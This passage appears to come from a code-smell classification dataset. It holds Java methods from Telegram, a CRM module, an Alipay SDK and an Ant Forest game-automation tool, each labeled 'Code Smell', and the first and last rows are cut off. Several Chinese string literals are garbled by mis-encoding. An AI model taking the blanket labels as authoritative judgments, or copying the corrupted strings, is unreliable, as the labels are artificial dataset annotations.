  List<ModuleTeamMember> members=this.getTeamMemberByDataId(memberSaveBO.getModuleId(),memberSaveBO.getDataId());
  Map<Long,ModuleTeamMember> existUsers=members.stream().collect(Collectors.toMap(ModuleTeamMember::getUserId,Function.identity()));
  ModuleFieldDataCommon dataCommon=dataCommonService.getByDataId(memberSaveBO.getDataId());
  List<ModuleTeamMember> teamMembers=new ArrayList<>();
  List<ModuleDataOperationRecord> operationRecords=new ArrayList<>();
  List<Long> receivers=new ArrayList<>();
  for (  Long memberId : memberSaveBO.getMemberIds()) {
    ModuleTeamMember existMember=existUsers.get(memberId);
    if (ObjectUtil.isNotNull(existMember)) {
      removeById(existMember.getId());
    }
    if (ObjectUtil.equal(dataCommon.getOwnerUserId(),memberId)) {
      continue;
    }
    ModuleTeamMember member=new ModuleTeamMember();
    member.setPower(memberSaveBO.getPower());
    member.setModuleId(memberSaveBO.getModuleId());
    member.setDataId(memberSaveBO.getDataId());
    member.setUserId(memberId);
    member.setCreateTime(DateUtil.date());
    member.setExpiresTime(memberSaveBO.getExpiresTime());
    member.setCreateUserId(UserUtil.getUserId());
    teamMembers.add(member);
    if (ObjectUtil.isNull(existMember)) {
      operationRecords.add(operationRecordService.initTeamUserEntity(module.getModuleId(),module.getVersion(),memberSaveBO.getDataId(),mainFieldValue,memberId,ActionTypeEnum.ADD_TEAM_MEMBER));
      receivers.add(memberId);
    }
  }
  saveBatch(teamMembers);
  MessageBO messageBO=new MessageBO();
  messageBO.setDataId(memberSaveBO.getDataId());
  messageBO.setValue(UserUtil.getUser().getNickname() + ""灏嗘偍娣诲姞涓�"" + module.getName());
  messageBO.setModuleId(module.getModuleId());
  messageBO.setModuleName(module.getName());
  messageBO.setTypeId(0L);
  messageBO.setTypeName(mainFieldValue);
  messageBO.setExtData(null);
  messageBO.setType(4);
  messageBO.setReceivers(receivers);
  messageBO.setCreateUserId(UserUtil.getUserId());
  ApplicationContextHolder.getBean(IMessageService.class).sendMessage(messageBO);
  operationRecordService.saveBatch(operationRecords);
  List<ModuleTeamMember> memberList=this.getTeamMemberByDataId(dataCommon.getModuleId(),dataCommon.getDataId());
  List<Long> memberIds=memberList.stream().map(ModuleTeamMember::getUserId).collect(Collectors.toList());
  dataCommon.setTeamMember(JSON.toJSONString(memberIds));
  dataCommon.setUpdateTime(DateUtil.date());
  dataCommonService.updateById(dataCommon);
  Map<String,Object> fieldValueMap=new HashMap<>(1);
  fieldValueMap.put(""teamMember"",memberIds);
  updateField(fieldValueMap,dataCommon.getDataId(),dataCommon.getModuleId());
}",1,Code Smell
"private void didPressedButton(){
  if (buttonState == 0) {
    boolean result=MediaController.getInstance().playMessage(currentMessageObject);
    if (!currentMessageObject.isOut() && (currentMessageObject.isContentUnread())) {
      if (currentMessageObject.messageOwner.peer_id.channel_id == 0) {
        MessagesController.getInstance(currentAccount).markMessageContentAsRead(currentMessageObject);
        currentMessageObject.setContentIsRead();
      }
    }
    if (result) {
      buttonState=1;
      invalidate();
    }
  }
 else   if (buttonState == 1) {
    boolean result=MediaController.getInstance().pauseMessage(currentMessageObject);
    if (result) {
      buttonState=0;
      invalidate();
    }
  }
 else   if (buttonState == 2) {
    FileLoader.getInstance(currentAccount).loadFile(currentMessageObject.getDocument(),currentMessageObject,FileLoader.PRIORITY_NORMAL,0);
    buttonState=4;
    invalidate();
  }
 else   if (buttonState == 3) {
    FileLoader.getInstance(currentAccount).cancelLoadFile(currentMessageObject.getDocument());
    buttonState=2;
    invalidate();
  }
}",1,Code Smell
"private void syncPullStream(String mediaServerId){
  MediaServer mediaServer=mediaServerService.getOne(mediaServerId);
  if (mediaServer != null) {
    List<MediaInfo> mediaInfoList=redisCatchStorage.getStreams(mediaServerId,""PULL"");
    if (!mediaInfoList.isEmpty()) {
      List<StreamInfo> mediaList=mediaServerService.getMediaList(mediaServer,null,null,null);
      Map<String,StreamInfo> stringStreamInfoMap=new HashMap<>();
      if (mediaList != null && !mediaList.isEmpty()) {
        for (        StreamInfo streamInfo : mediaList) {
          stringStreamInfoMap.put(streamInfo.getApp() + streamInfo.getStream(),streamInfo);
        }
      }
      if (stringStreamInfoMap.isEmpty()) {
        redisCatchStorage.removeStream(mediaServerId,""PULL"");
      }
 else {
        for (        String key : stringStreamInfoMap.keySet()) {
          StreamInfo streamInfo=stringStreamInfoMap.get(key);
          if (stringStreamInfoMap.get(streamInfo.getApp() + streamInfo.getStream()) == null) {
            redisCatchStorage.removeStream(mediaServerId,""PULL"",streamInfo.getApp(),streamInfo.getStream());
          }
        }
      }
    }
  }
}
",1,Code Smell
"private static void collectEnergy(JSONArray bubbleVOList){
  try {
    for (int i=0; i < bubbleVOList.length(); i++) {
      JSONObject bubble=bubbleVOList.getJSONObject(i);
      if (!""ocean"".equals(bubble.getString(""channel""))) {
        continue;
      }
      if (""AVAILABLE"".equals(bubble.getString(""collectStatus""))) {
        long bubbleId=bubble.getLong(""id"");
        String userId=bubble.getString(""userId"");
        String s=AntForestRpcCall.collectEnergy(null,userId,bubbleId);
        JSONObject jo=new JSONObject(s);
        if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
          JSONArray retBubbles=jo.optJSONArray(""bubbles"");
          if (retBubbles != null) {
            for (int j=0; j < retBubbles.length(); j++) {
              JSONObject retBubble=retBubbles.optJSONObject(j);
              if (retBubble != null) {
                int collectedEnergy=retBubble.getInt(""collectedEnergy"");
                Log.forest(""绁炲娴锋磱馃惓鏀跺彇["" + FriendIdMap.getNameById(userId) + ""]鐨勬捣娲嬭兘閲�#""+ collectedEnergy+ ""g"");
              }
            }
          }
        }
 else {
          Log.i(TAG,jo.getString(""resultDesc""));
        }
      }
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""queryHomePage err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"/** 
 * Leading annotations and modifiers in the order they appear in the source, which is not necessarily the same as the order in which they appear in the OpenJDK AST
 */
private ReloadableJava17ModifierResults sortedModifiersAndAnnotations(ModifiersTree modifiers,Map<Integer,JCAnnotation> annotationPosTable){
  List<J.Annotation> leadingAnnotations=new ArrayList<>();
  List<J.Modifier> sortedModifiers=new ArrayList<>();
  List<J.Annotation> currentAnnotations=new ArrayList<>(2);
  boolean afterFirstModifier=false;
  boolean inComment=false;
  boolean inMultilineComment=false;
  int afterLastModifierPosition=cursor;
  int lastAnnotationPosition=cursor;
  int keywordStartIdx=-1;
  for (int i=cursor; i < source.length(); i++) {
    if (annotationPosTable.containsKey(i)) {
      J.Annotation annotation=convert(annotationPosTable.get(i));
      if (afterFirstModifier) {
        currentAnnotations.add(annotation);
      }
 else {
        leadingAnnotations.add(annotation);
      }
      i=cursor - 1;
      lastAnnotationPosition=cursor;
      continue;
    }
    char c=source.charAt(i);
    if (c == '/' && source.length() > i + 1) {
      char next=source.charAt(i + 1);
      if (next == '*') {
        inMultilineComment=true;
      }
 else       if (next == '/') {
        inComment=true;
      }
    }
    if (inMultilineComment && c == '/' && source.charAt(i - 1) == '*') {
      inMultilineComment=false;
    }
 else     if (inComment && c == '\n' || c == '\r') {
      inComment=false;
    }
 else     if (!inMultilineComment && !inComment) {
      if (Character.isWhitespace(c)) {
        if (keywordStartIdx != -1) {
          Modifier matching=MODIFIER_BY_KEYWORD.get(source.substring(keywordStartIdx,i));
          keywordStartIdx=-1;
          if (matching == null) {
            this.cursor=afterLastModifierPosition;
            break;
          }
 else {
            sortedModifiers.add(mapModifier(matching,currentAnnotations));
            afterFirstModifier=true;
            currentAnnotations=new ArrayList<>(2);
            afterLastModifierPosition=cursor;
          }
        }
      }
 else       if (keywordStartIdx == -1) {
        keywordStartIdx=i;
      }
    }
  }
  if (sortedModifiers.isEmpty()) {
    cursor=lastAnnotationPosition;
  }
  return new ReloadableJava17ModifierResults(leadingAnnotations.isEmpty() ? emptyList() : leadingAnnotations,sortedModifiers.isEmpty() ? emptyList() : sortedModifiers);
}",1,Code Smell
"public void loadGlobalNotificationsSettings(){
  if (loadingNotificationSettings == 0 && !getUserConfig().notificationsSettingsLoaded) {
    SharedPreferences preferences=MessagesController.getNotificationsSettings(currentAccount);
    SharedPreferences.Editor editor1=null;
    if (preferences.contains(""EnableGroup"")) {
      boolean enabled=preferences.getBoolean(""EnableGroup"",true);
      editor1=preferences.edit();
      if (!enabled) {
        editor1.putInt(""EnableGroup2"",Integer.MAX_VALUE);
        editor1.putInt(""EnableChannel2"",Integer.MAX_VALUE);
      }
      editor1.remove(""EnableGroup"").commit();
    }
    if (preferences.contains(""EnableAll"")) {
      boolean enabled=preferences.getBoolean(""EnableAll"",true);
      if (editor1 == null) {
        editor1=preferences.edit();
      }
      if (!enabled) {
        editor1.putInt(""EnableAll2"",Integer.MAX_VALUE);
      }
      editor1.remove(""EnableAll"").commit();
    }
    if (editor1 != null) {
      editor1.commit();
    }
    loadingNotificationSettings=3;
    for (int a=0; a < 3; a++) {
      TLRPC.TL_account_getNotifySettings req=new TLRPC.TL_account_getNotifySettings();
      if (a == 0) {
        req.peer=new TLRPC.TL_inputNotifyChats();
      }
 else       if (a == 1) {
        req.peer=new TLRPC.TL_inputNotifyUsers();
      }
 else {
        req.peer=new TLRPC.TL_inputNotifyBroadcasts();
      }
      int type=a;
      getConnectionsManager().sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
        if (response != null) {
          loadingNotificationSettings--;
          TLRPC.TL_peerNotifySettings notify_settings=(TLRPC.TL_peerNotifySettings)response;
          SharedPreferences.Editor editor=notificationsPreferences.edit();
          if (type == 0) {
            if ((notify_settings.flags & 1) != 0) {
              editor.putBoolean(""EnablePreviewGroup"",notify_settings.show_previews);
            }
            if ((notify_settings.flags & 2) != 0) {
            }
            if ((notify_settings.flags & 4) != 0) {
              editor.putInt(""EnableGroup2"",notify_settings.mute_until);
            }
          }
 else           if (type == 1) {
            if ((notify_settings.flags & 1) != 0) {
              editor.putBoolean(""EnablePreviewAll"",notify_settings.show_previews);
            }
            if ((notify_settings.flags & 2) != 0) {
            }
            if ((notify_settings.flags & 4) != 0) {
              editor.putInt(""EnableAll2"",notify_settings.mute_until);
            }
          }
 else {
            if ((notify_settings.flags & 1) != 0) {
              editor.putBoolean(""EnablePreviewChannel"",notify_settings.show_previews);
            }
            if ((notify_settings.flags & 2) != 0) {
            }
            if ((notify_settings.flags & 4) != 0) {
              editor.putInt(""EnableChannel2"",notify_settings.mute_until);
            }
          }
          getNotificationsController().getNotificationsSettingsFacade().applySoundSettings(notify_settings.android_sound,editor,0,0,type,false);
          editor.commit();
          if (loadingNotificationSettings == 0) {
            getUserConfig().notificationsSettingsLoaded=true;
            getUserConfig().saveConfig(false);
          }
        }
      }
));
    }
  }
  if (!getUserConfig().notificationsSignUpSettingsLoaded) {
    loadSignUpNotificationsSettings();
  }
}",1,Code Smell
"public static void analysisAndAppendInfoToIntent(Intent intent,StackTraceElement[] stackTraceElements){
  if (intent == null || stackTraceElements == null || CodeLocator.sGlobalConfig == null || intent.getStringExtra(CodeLocatorConstants.ACTIVITY_START_STACK_INFO) != null) {
    return;
  }
  final CodeLocatorConfig config=CodeLocator.sGlobalConfig;
  try {
    StackTraceElement findElement=null;
    for (int i=config.getSkipSystemTraceCount(); i < stackTraceElements.length && i < config.getActivityMaxLoopCount(); i++) {
      final StackTraceElement stackTraceElement=stackTraceElements[i];
      final String currentClassName=stackTraceElement.getClassName();
      final String currentMethodName=stackTraceElement.getMethodName();
      final String fileName=stackTraceElement.getFileName();
      if (fileName == null || currentClassName == null || config.getActivityIgnoreByClazzs().contains(currentClassName)) {
        continue;
      }
 else {
        boolean containsKeyword=false;
        for (        String keyword : config.getActivityIgnoreByKeyWords()) {
          if (currentClassName.contains(keyword) || (currentMethodName != null && currentMethodName.contains(keyword))) {
            containsKeyword=true;
            break;
          }
        }
        if (containsKeyword) {
          continue;
        }
      }
      findElement=stackTraceElement;
      break;
    }
    if (findElement == null) {
      return;
    }
    String className=findElement.getClassName();
    final int lineNumber=findElement.getLineNumber();
    final String fileName=findElement.getFileName();
    final int suffixIndex=fileName.lastIndexOf(""."");
    String suffix="""";
    if (suffixIndex > -1) {
      suffix=fileName.substring(suffixIndex);
    }
    if (className.contains(""$"")) {
      className=className.substring(0,className.indexOf(""$""));
    }
    intent.putExtra(CodeLocatorConstants.ACTIVITY_START_STACK_INFO,className + suffix + "":""+ lineNumber);
  }
 catch (  Throwable t) {
    Log.d(CodeLocator.TAG,""analysisAndAppendInfoToIntent Error "" + Log.getStackTraceString(t));
  }
}",1,Code Smell
"private void loadStat(){
  TLRPC.TL_stats_getMessageStats req=new TLRPC.TL_stats_getMessageStats();
  if (messageObject.messageOwner.fwd_from != null) {
    req.msg_id=messageObject.messageOwner.fwd_from.saved_from_msg_id;
    req.channel=getMessagesController().getInputChannel(-messageObject.getFromChatId());
  }
 else {
    req.msg_id=messageObject.getId();
    req.channel=getMessagesController().getInputChannel(-messageObject.getDialogId());
  }
  getConnectionsManager().sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
    statsLoaded=true;
    if (error != null) {
      updateRows();
      return;
    }
    TLRPC.TL_stats_messageStats res=(TLRPC.TL_stats_messageStats)response;
    interactionsViewData=StatisticActivity.createViewData(res.views_graph,LocaleController.getString(""InteractionsChartTitle"",R.string.InteractionsChartTitle),1,false);
    if (interactionsViewData != null && interactionsViewData.chartData.x.length <= 5) {
      statsLoaded=false;
      TLRPC.TL_stats_loadAsyncGraph request=new TLRPC.TL_stats_loadAsyncGraph();
      request.token=interactionsViewData.zoomToken;
      request.x=interactionsViewData.chartData.x[interactionsViewData.chartData.x.length - 1];
      request.flags|=1;
      final String cacheKey=interactionsViewData.zoomToken + ""_"" + request.x;
      int reqId=ConnectionsManager.getInstance(currentAccount).sendRequest(request,(response1,error1) -> {
        ChartData childData=null;
        if (response1 instanceof TLRPC.TL_statsGraph) {
          String json=((TLRPC.TL_statsGraph)response1).json.data;
          try {
            childData=StatisticActivity.createChartData(new JSONObject(json),1,false);
          }
 catch (          JSONException e) {
            e.printStackTrace();
          }
        }
 else         if (response1 instanceof TLRPC.TL_statsGraphError) {
          AndroidUtilities.runOnUIThread(() -> {
            if (getParentActivity() != null) {
              Toast.makeText(getParentActivity(),((TLRPC.TL_statsGraphError)response1).error,Toast.LENGTH_LONG).show();
            }
          }
);
        }
        ChartData finalChildData=childData;
        AndroidUtilities.runOnUIThread(() -> {
          statsLoaded=true;
          if (error1 != null || finalChildData == null) {
            updateRows();
            return;
          }
          childDataCache.put(cacheKey,finalChildData);
          interactionsViewData.childChartData=finalChildData;
          interactionsViewData.activeZoom=request.x;
          updateRows();
        }
);
      }
,null,null,0,chat.stats_dc,ConnectionsManager.ConnectionTypeGeneric,true);
      ConnectionsManager.getInstance(currentAccount).bindRequestToGuid(reqId,classGuid);
    }
 else {
      updateRows();
    }
  }
),null,null,0,chat.stats_dc,ConnectionsManager.ConnectionTypeGeneric,true);
}",1,Code Smell
"private void requestLinkPreview(TLRPC.TL_messages_getWebPagePreview req,Utilities.Callback2<Boolean,TLRPC.WebPage> done){
  cancelSearchLinks();
  linkSearchRequestId=getConnectionsManager().sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
    linkSearchRequestId=0;
    if (response instanceof TLRPC.TL_messageMediaWebPage) {
      TLRPC.TL_messageMediaWebPage media=(TLRPC.TL_messageMediaWebPage)response;
      if (media.webpage != null && ""telegram_story"".equals(media.webpage.type)) {
        TLRPC.TL_webPageAttributeStory _attrStory=null;
        if (media.webpage.attributes != null) {
          for (int i=0; i < media.webpage.attributes.size(); ++i) {
            if (media.webpage.attributes.get(i) instanceof TLRPC.TL_webPageAttributeStory) {
              _attrStory=(TLRPC.TL_webPageAttributeStory)media.webpage.attributes.get(i);
              break;
            }
          }
        }
        if (_attrStory == null) {
          done.run(false,null);
          return;
        }
        if (_attrStory != null && _attrStory.storyItem != null) {
          done.run(true,media.webpage);
          return;
        }
        final TLRPC.TL_webPageAttributeStory attrStory=_attrStory;
        getMessagesStorage().getStorageQueue().postRunnable(() -> {
          try {
            LongSparseArray<ArrayList<MessageObject>> array=new LongSparseArray<>();
            TLRPC.TL_message message=new TLRPC.TL_message();
            message.message="""";
            message.id=0;
            message.media=media;
            ArrayList<MessageObject> list=new ArrayList<>();
            list.add(new MessageObject(currentAccount,message,false,false));
            array.put(DialogObject.getPeerDialogId(attrStory.peer),list);
            getMessagesController().getStoriesController().getStoriesStorage().fillMessagesWithStories(array,() -> {
              MessageObject result=null;
              if (array.size() == 1 && array.valueAt(0) != null && array.valueAt(0).size() == 1) {
                result=array.valueAt(0).get(0);
              }
              if (result != null && result.messageOwner != null && result.messageOwner.media != null && result.messageOwner.media.webpage != null && result.messageOwner.media.webpage.attributes != null) {
                for (int i=0; i < result.messageOwner.media.webpage.attributes.size(); ++i) {
                  TLRPC.WebPageAttribute attr=result.messageOwner.media.webpage.attributes.get(i);
                  if (attr instanceof TLRPC.TL_webPageAttributeStory) {
                    if (((TLRPC.TL_webPageAttributeStory)attr).storyItem != null) {
                      final TLRPC.WebPage webpage=result.messageOwner.media.webpage;
                      AndroidUtilities.runOnUIThread(() -> {
                        done.run(true,webpage);
                      }
);
                      return;
                    }
                  }
                }
              }
              AndroidUtilities.runOnUIThread(() -> {
                done.run(false,null);
              }
);
            }
,classGuid,false);
          }
 catch (          Exception ignore) {
          }
        }
);
      }
 else {
        done.run(media.webpage != null,media.webpage);
      }
    }
 else {
      done.run(false,null);
    }
  }
));
  getConnectionsManager().bindRequestToGuid(linkSearchRequestId,classGuid);
}",1,Code Smell
"@Override public DrmSession<T> acquireSession(Looper playbackLooper,DrmInitData drmInitData){
  Assertions.checkState(this.playbackLooper == null || this.playbackLooper == playbackLooper);
  if (sessions.isEmpty()) {
    this.playbackLooper=playbackLooper;
    if (mediaDrmHandler == null) {
      mediaDrmHandler=new MediaDrmHandler(playbackLooper);
    }
  }
  List<SchemeData> schemeDatas=null;
  if (offlineLicenseKeySetId == null) {
    schemeDatas=getSchemeDatas(drmInitData,uuid,false);
    if (schemeDatas.isEmpty()) {
      final MissingSchemeDataException error=new MissingSchemeDataException(uuid);
      eventDispatcher.dispatch(listener -> listener.onDrmSessionManagerError(error));
      return new ErrorStateDrmSession<>(new DrmSessionException(error));
    }
  }
  DefaultDrmSession<T> session;
  if (!multiSession) {
    session=sessions.isEmpty() ? null : sessions.get(0);
  }
 else {
    session=null;
    for (    DefaultDrmSession<T> existingSession : sessions) {
      if (Util.areEqual(existingSession.schemeDatas,schemeDatas)) {
        session=existingSession;
        break;
      }
    }
  }
  if (session == null) {
    session=new DefaultDrmSession<>(uuid,mediaDrm,this,schemeDatas,mode,offlineLicenseKeySetId,optionalKeyRequestParameters,callback,playbackLooper,eventDispatcher,initialDrmRequestRetryCount);
    sessions.add(session);
  }
  session.acquire();
  return session;
}",1,Code Smell
"void onTextChanged(CharSequence text,boolean bigChange);
@Override public void onTextChanged(CharSequence charSequence,int start,int before,int count){
  if (ignorePrevTextChange) {
    return;
  }
  boolean allowChangeToSmile=true;
  int currentPage;
  if (emojiView == null) {
    currentPage=MessagesController.getGlobalEmojiSettings().getInt(""selected_page"",0);
  }
 else {
    currentPage=emojiView.getCurrentPage();
  }
  if (currentPage == 0 || !allowStickers && !allowGifs) {
    allowChangeToSmile=false;
  }
  if ((before == 0 && !TextUtils.isEmpty(charSequence) || before != 0 && TextUtils.isEmpty(charSequence)) && allowChangeToSmile) {
    setEmojiButtonImage(false,true);
  }
  if (lineCount != messageEditText.getLineCount()) {
    heightShouldBeChanged=(messageEditText.getLineCount() >= 4) != (lineCount >= 4);
    if (!isInitLineCount && messageEditText.getMeasuredWidth() > 0) {
      onLineCountChanged(lineCount,messageEditText.getLineCount());
    }
    lineCount=messageEditText.getLineCount();
  }
 else {
    heightShouldBeChanged=false;
  }
  if (innerTextChange == 1) {
    return;
  }
  if (sendByEnter && !isPaste && editingMessageObject == null && count > before && charSequence.length() > 0 && charSequence.length() == start + count && charSequence.charAt(charSequence.length() - 1) == '\n') {
    nextChangeIsSend=true;
  }
  isPaste=false;
  checkSendButton(true);
  CharSequence message=AndroidUtilities.getTrimmedString(charSequence.toString());
  if (delegate != null) {
    if (!ignoreTextChange) {
      if ((before > count + 1 || (count - before) > 2 || TextUtils.isEmpty(charSequence)) && delegate.getDisableLinkPreviewStatus() == 1) {
        messageWebPageSearch=true;
      }
      delegate.onTextChanged(charSequence,before > count + 1 || (count - before) > 2);
    }
  }
  if (innerTextChange != 2 && (count - before) > 1) {
    processChange=true;
  }
  if (editingMessageObject == null && !canWriteToChannel && message.length() != 0 && lastTypingTimeSend < System.currentTimeMillis() - 5000 && !ignoreTextChange) {
    lastTypingTimeSend=System.currentTimeMillis();
    if (delegate != null) {
      delegate.needSendTyping();
    }
  }
}",1,Code Smell
"private void setVideoPlayerControlVisible(boolean visible,boolean animated){
  if (videoPlayerControlVisible != visible) {
    if (videoPlayerControlAnimator != null) {
      videoPlayerControlAnimator.cancel();
    }
    videoPlayerControlVisible=visible;
    if (animated) {
      if (visible) {
        videoPlayerControlFrameLayout.setVisibility(View.VISIBLE);
      }
 else {
        dateTextView.setVisibility(View.VISIBLE);
        nameTextView.setVisibility(View.VISIBLE);
        if (allowShare) {
          bottomButtonsLayout.setVisibility(View.VISIBLE);
        }
      }
      final boolean shareWasAllowed=allowShare;
      final ValueAnimator anim=ValueAnimator.ofFloat(videoPlayerControlFrameLayout.getAlpha(),visible ? 1f : 0f);
      anim.setDuration(200);
      anim.addUpdateListener(a -> {
        final float alpha=(float)a.getAnimatedValue();
        videoPlayerControlFrameLayout.setAlpha(alpha);
        dateTextView.setAlpha(1f - alpha);
        nameTextView.setAlpha(1f - alpha);
        if (shareWasAllowed) {
          bottomButtonsLayout.setAlpha(1f - alpha);
        }
      }
);
      anim.addListener(new AnimatorListenerAdapter(){
        @Override public void onAnimationEnd(        Animator animation){
          if (!visible) {
            videoPlayerControlFrameLayout.setVisibility(View.GONE);
          }
 else {
            dateTextView.setVisibility(View.GONE);
            nameTextView.setVisibility(View.GONE);
            if (shareWasAllowed) {
              bottomButtonsLayout.setVisibility(View.GONE);
            }
          }
        }
      }
);
      videoPlayerControlAnimator=anim;
      anim.start();
    }
 else {
      videoPlayerControlFrameLayout.setVisibility(visible ? View.VISIBLE : View.GONE);
      videoPlayerControlFrameLayout.setAlpha(visible ? 1f : 0f);
      dateTextView.setVisibility(visible ? View.GONE : View.VISIBLE);
      dateTextView.setAlpha(visible ? 0f : 1f);
      nameTextView.setVisibility(visible ? View.GONE : View.VISIBLE);
      nameTextView.setAlpha(visible ? 0f : 1f);
      if (allowShare) {
        bottomButtonsLayout.setVisibility(visible ? View.GONE : View.VISIBLE);
        bottomButtonsLayout.setAlpha(visible ? 0f : 1f);
      }
    }
    if (allowShare && pageBlocksAdapter == null) {
      if (visible) {
        menuItem.showSubItem(gallery_menu_share);
      }
 else {
        menuItem.hideSubItem(gallery_menu_share);
      }
    }
  }
}",1,Code Smell
"/** 
 * Copy a string of size from src to dst
 * @param dstAbsVal the dst pointer AbsVal
 * @param srcAbsVal the src pointer AbsVal
 * @param absEnv the AbsEnv
 * @param size the size to copy from src to dst
 * @return return true if success
 */
public static boolean copyString(AbsVal dstAbsVal,AbsVal srcAbsVal,AbsEnv absEnv,int size){
  int offset=0;
  ALoc ptrALoc=ALoc.getALoc(srcAbsVal.getRegion(),srcAbsVal.getValue(),1);
  while (true) {
    Entry<ALoc,KSet> entry=absEnv.getOverlapEntry(ptrALoc);
    if (entry == null) {
      break;
    }
    KSet srcStrKSet=entry.getValue();
    if (!srcStrKSet.isNormal() || !srcStrKSet.iterator().hasNext()) {
      break;
    }
    if (!srcStrKSet.isSingleton()) {
      break;
    }
    AbsVal strAbsVal=srcStrKSet.iterator().next();
    byte[] strByteArray=StringUtils.getByteArray(strAbsVal,srcStrKSet.getBits());
    int idx=ArrayUtils.indexOf(strByteArray,(byte)0);
    int nowStrLen=(idx == -1 ? strByteArray.length : idx + 1);
    if (offset + nowStrLen > size) {
      idx=size - offset;
    }
    if (idx != -1) {
      byte[] bytes=Arrays.copyOf(strByteArray,++idx);
      bytes[idx - 1]=0;
      if (GlobalState.arch.isLittleEndian()) {
        ArrayUtils.reverse(bytes);
      }
      KSet kSet=new KSet(idx * 8);
      if (idx > 8) {
        kSet=kSet.insert(new AbsVal(new BigInteger(bytes)));
      }
 else {
        kSet=kSet.insert(new AbsVal(new BigInteger(bytes).longValue()));
      }
      ALoc dstALoc=ALoc.getALoc(dstAbsVal.getRegion(),dstAbsVal.getValue() + offset,idx);
      absEnv.set(dstALoc,kSet,true);
      return true;
    }
    ALoc srcStrALoc=entry.getKey();
    ALoc dstALoc=ALoc.getALoc(dstAbsVal.getRegion(),dstAbsVal.getValue() + offset,srcStrALoc.getLen());
    absEnv.set(dstALoc,srcStrKSet,true);
    offset+=srcStrALoc.getLen();
    ptrALoc=ALoc.getALoc(srcAbsVal.getRegion(),srcAbsVal.getValue() + offset,1);
  }
  if (ptrALoc.isGlobalReadable()) {
    String str=StringUtils.getStringFromProgramData(GlobalState.flatAPI.toAddr(srcAbsVal.getValue()));
    if (str == null) {
      return false;
    }
    byte[] tmp=str.getBytes();
    byte[] bytes=new byte[Math.min(str.length(),size) + 1];
    System.arraycopy(tmp,0,bytes,0,Math.min(str.length(),size));
    if (GlobalState.arch.isLittleEndian()) {
      ArrayUtils.reverse(bytes);
    }
    KSet kSet=new KSet(bytes.length * 8);
    AbsVal absVal;
    if (bytes.length > 8) {
      absVal=new AbsVal(new BigInteger(bytes));
    }
 else {
      absVal=new AbsVal(new BigInteger(bytes).longValue());
    }
    ALoc dstALoc=ALoc.getALoc(dstAbsVal.getRegion(),dstAbsVal.getValue(),bytes.length);
    absEnv.set(dstALoc,kSet.insert(absVal),true);
    return true;
  }
  return false;
}",1,Code Smell
"/** 
 * 鏋勫缓 import 瀵煎寘銆�
 */
public List<String> buildImports(boolean isBase){
  Set<String> imports=new HashSet<>();
  if (!isBase) {
    imports.add(""com.mybatisflex.annotation.Table"");
  }
  EntityConfig entityConfig=globalConfig.getEntityConfig();
  if (!entityConfig.isWithBaseClassEnable() || (entityConfig.isWithBaseClassEnable() && isBase)) {
    for (    Column column : columns) {
      imports.addAll(column.getImportClasses());
    }
    Class<?> superClass=entityConfig.getSuperClass(this);
    if (superClass != null) {
      imports.add(superClass.getName());
    }
    if (entityConfig.getImplInterfaces() != null) {
      for (      Class<?> entityInterface : entityConfig.getImplInterfaces()) {
        imports.add(entityInterface.getName());
      }
    }
  }
  if (!entityConfig.isWithBaseClassEnable() || (entityConfig.isWithBaseClassEnable() && !isBase)) {
    if (tableConfig != null) {
      if (tableConfig.getInsertListenerClass() != null) {
        imports.add(tableConfig.getInsertListenerClass().getName());
      }
      if (tableConfig.getUpdateListenerClass() != null) {
        imports.add(tableConfig.getUpdateListenerClass().getName());
      }
      if (tableConfig.getSetListenerClass() != null) {
        imports.add(tableConfig.getSetListenerClass().getName());
      }
    }
  }
  return imports.stream().sorted(Comparator.naturalOrder()).collect(Collectors.toList());
}
",1,Code Smell
"public AlipayTradeQueryResponse query(String outTradeNo) throws Exception {
  java.util.Map<String,Object> runtime_=TeaConverter.buildMap(new TeaPair(""connectTimeout"",15000),new TeaPair(""readTimeout"",15000),new TeaPair(""retry"",TeaConverter.buildMap(new TeaPair(""maxAttempts"",0))));
  TeaRequest _lastRequest=null;
  long _now=System.currentTimeMillis();
  int _retryTimes=0;
  while (Tea.allowRetry((java.util.Map<String,Object>)runtime_.get(""retry""),_retryTimes,_now)) {
    if (_retryTimes > 0) {
      int backoffTime=Tea.getBackoffTime(runtime_.get(""backoff""),_retryTimes);
      if (backoffTime > 0) {
        Tea.sleep(backoffTime);
      }
    }
    _retryTimes=_retryTimes + 1;
    try {
      TeaRequest request_=new TeaRequest();
      java.util.Map<String,String> systemParams=TeaConverter.buildMap(new TeaPair(""method"",""alipay.trade.query""),new TeaPair(""app_id"",_getConfig(""appId"")),new TeaPair(""timestamp"",_getTimestamp()),new TeaPair(""format"",""json""),new TeaPair(""version"",""1.0""),new TeaPair(""alipay_sdk"",_getSdkVersion()),new TeaPair(""charset"",""UTF-8""),new TeaPair(""sign_type"",_getConfig(""signType"")),new TeaPair(""app_cert_sn"",_getMerchantCertSN()),new TeaPair(""alipay_root_cert_sn"",_getAlipayRootCertSN()));
      java.util.Map<String,Object> bizParams=TeaConverter.buildMap(new TeaPair(""out_trade_no"",outTradeNo));
      java.util.Map<String,String> textParams=new java.util.HashMap<>();
      request_.protocol=_getConfig(""protocol"");
      request_.method=""POST"";
      request_.pathname=""/gateway.do"";
      request_.headers=TeaConverter.buildMap(new TeaPair(""host"",_getConfig(""gatewayHost"")),new TeaPair(""content-type"",""application/x-www-form-urlencoded;charset=utf-8""));
      request_.query=TeaConverter.merge(String.class,TeaConverter.buildMap(new TeaPair(""sign"",_sign(systemParams,bizParams,textParams,_getConfig(""merchantPrivateKey"")))),systemParams,textParams);
      request_.body=Tea.toReadable(_toUrlEncodedRequestBody(bizParams));
      _lastRequest=request_;
      TeaResponse response_=Tea.doAction(request_,runtime_);
      java.util.Map<String,Object> respMap=_readAsJson(response_,""alipay.trade.query"");
      if (_isCertMode()) {
        if (_verify(respMap,_extractAlipayPublicKey(_getAlipayCertSN(respMap)))) {
          return TeaModel.toModel(_toRespModel(respMap),new AlipayTradeQueryResponse());
        }
      }
 else {
        if (_verify(respMap,_getConfig(""alipayPublicKey""))) {
          return TeaModel.toModel(_toRespModel(respMap),new AlipayTradeQueryResponse());
        }
      }
